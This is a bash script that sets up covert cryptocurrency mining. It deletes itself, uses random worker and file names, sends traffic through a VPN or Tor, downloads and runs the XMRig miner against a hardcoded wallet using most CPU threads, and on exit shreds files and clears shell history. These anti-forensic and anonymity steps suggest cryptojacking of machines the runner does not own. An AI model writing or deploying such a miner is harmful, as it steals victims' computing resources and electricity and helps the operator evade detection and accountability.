#!/bin/bash
# Auto-delete script after first run
if [ "$0" = "$BASH_SOURCE" ]; then
    rm -- "$0"
fi

WALLET="BrRNyvr6TJfhqFewqWenyuC4VrfFAZXJoiPBkLbc8eRk"
COIN="SOL"
WORKER_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)
THREADS=$(( $(nproc) - 1 ))
ANON_MODE=${1:-vpn}  # vpn/tor/plain

setup_vpn() {
    echo "[+] Configuring WireGuard VPN"
    sudo apt-get install -y wireguard resolvconf
    wget https://am.i.mullvad.net/wg/ -O mullvad.conf
    sudo cp mullvad.conf /etc/wireguard/
    sudo wg-quick up mullvad.conf
}

setup_tor() {
    echo "[+] Configuring Tor anonymity"
    sudo apt-get install -y tor torsocks
    echo "SOCKSPort 9050" | sudo tee -a /etc/tor/torrc
    sudo systemctl restart tor
    export ALL_PROXY=socks5://127.0.0.1:9050
}

start_mining() {
    case $ANON_MODE in
        vpn) setup_vpn ;;
        tor) setup_tor ;;
    esac

    MINER_FILE=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
    wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O $MINER_FILE.tar.gz
    tar -xzf $MINER_FILE.tar.gz
    cd $(tar -tzf $MINER_FILE.tar.gz | head -1 | cut -f1 -d"/")
    
    ./xmrig -o rx.unmineable.com:3333 -u $COIN:$WALLET.$WORKER_NAME \
        --tls --keepalive --randomx-1gb-pages \
        --cpu-max-threads-hint=75 --donate-level=0 \
        --http-host=127.0.0.1 --http-port=0
}

cleanup() {
    shred -u setup.sh miner.tar.gz
    history -c
}

trap cleanup EXIT
start_mining
